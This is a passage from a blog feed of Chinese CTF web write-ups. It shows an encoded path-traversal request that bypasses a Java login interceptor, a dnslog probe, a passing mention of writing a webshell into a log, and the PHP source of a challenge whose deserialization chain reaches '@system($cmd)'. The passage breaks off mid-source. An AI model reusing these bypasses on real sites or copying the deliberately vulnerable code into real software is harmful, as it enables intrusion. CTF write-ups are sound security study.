href="mailto:&#80;&#x74;&#x6e;&#52;&#114;&#x64;&#x6e;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;">&#80;&#x74;&#x6e;&#52;&#114;&#x64;&#x6e;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;</a></p><p>reset 申请改一下密码，login 写🐎，然后访问日志完事。</p><h2 id="hackerweb"><a href="#hackerweb" class="headerlink" title="hackerweb"></a>hackerweb</h2><p>存在 /login 路由，java 题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">registry.addInterceptor(handlerInterceptor())</span><br><span class="line">.addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> HandlerInterceptor <span class="title">handlerInterceptor</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> PermissionInterceptor();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PermissionInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">String uri = request.getRequestURI();</span><br><span class="line">uri = uri.replaceAll(<span class="string">&quot;//&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;RequestURI: &quot;</span> + uri);</span><br><span class="line"><span class="keyword">if</span> (uri.contains(<span class="string">&quot;..&quot;</span>) || uri.contains(<span class="string">&quot;./&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (uri.startsWith(<span class="string">&quot;/login&quot;</span>) || uri.startsWith(<span class="string">&quot;/index&quot;</span>) || uri.startsWith(<span class="string">&quot;/image&quot;</span>) || uri.startsWith(<span class="string">&quot;/css&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以 <code>POST /login/%2e%2e/%61%64%6d%69%6e</code> 绕。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username&#x3D;admin&amp;Password&#x3D;admin</span><br></pre></td></tr></table></figure><p>发现 domain &amp; secert，这里纠结了很久。</p><p><img src="https://i.loli.net/2021/05/06/OILkxSRHgavoXc5.png"></p><p>domain 处传 dns 试试，回显 127.0.0.1，同时 dnslog 也有了回显：</p><p><img src="https://i.loli.net/2021/05/06/hrvM6FaG8oXdb9k.png"></p><p>总共大概是这四个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ea197db0 bf03c5f3 8841a402 75aaaf2e</span><br></pre></td></tr></table></figure><p>secert 处排列组合交一下 flag 就出了。</p><hr><p>顺带一提，这里是出题人英语比👴还差，打错单词了（secert -&gt; secret</p><h2 id="superadmin"><a href="#superadmin" class="headerlink" title="superadmin"></a>superadmin</h2><p>register 处 sql 注入，还没做出来，等一波赛后 wp 吧。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_PYCC_WEB5_WP</title>
      <link href="2021/05/04/2021-PYCC-WEB5-WP/"/>
      <url>2021/05/04/2021-PYCC-WEB5-WP/</url>
      
        <content type="html"><![CDATA[<p>看了看这道题，好像还蛮有意思的。。。pycc 反正不用多说，听师傅说这道题 509 解，哈哈哈。</p><hr><p>怪恶心的，和 @s1mple 师傅讨论了半天，恶心翻倍。</p><h2 id="which-is-the-true-iscc"><a href="#which-is-the-true-iscc" class="headerlink" title="which is the true iscc"></a>which is the true iscc</h2><p>贴一下源码吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$status</span> = <span class="string">&quot;new&quot;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$is_unser_finished</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$iscc_file</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = (count(<span class="variable">$_FILES</span>) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$iscc_file</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$is_upload</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">                <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file(<span class="variable">$iscc_file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$check</span> = @getimagesize(<span class="variable">$iscc_file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$check</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$target_dir</span> = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    <span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$iscc_file</span>[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$iscc_file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;我拿到了！&lt;br&gt;&quot;</span>;</span><br><span class="line">                        <span class="variable">$iscc_file</span> = <span class="variable">$target_file</span>;</span><br><span class="line">                        <span class="variable">$status</span> = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;拿不到:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            <span class="variable">$status</span> = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;你这罐子是空的!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$error</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            <span class="variable">$status</span> = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;东西都没给对!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$error</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        <span class="variable">$pAssM0rd</span> = hash(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pAssM0rd&#x27;</span>] === <span class="variable">$pAssM0rd</span>)</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;看看你干的好事: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_unser_finished</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$is_unser_finished</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params"><span class="variable">$len</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    <span class="variable">$randstring</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randstring</span> .= <span class="variable">$characters</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$characters</span>))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randstring</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$s</span>, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">    @unlink(<span class="variable">$iscc_file</span>);</span><br><span class="line">    <span class="variable">$status</span> = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$whatareyounongshane</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$whatareyounongshane</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;想越级干好事？还是有门的……&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            <span class="variable">$resp</span> = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$resp</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span 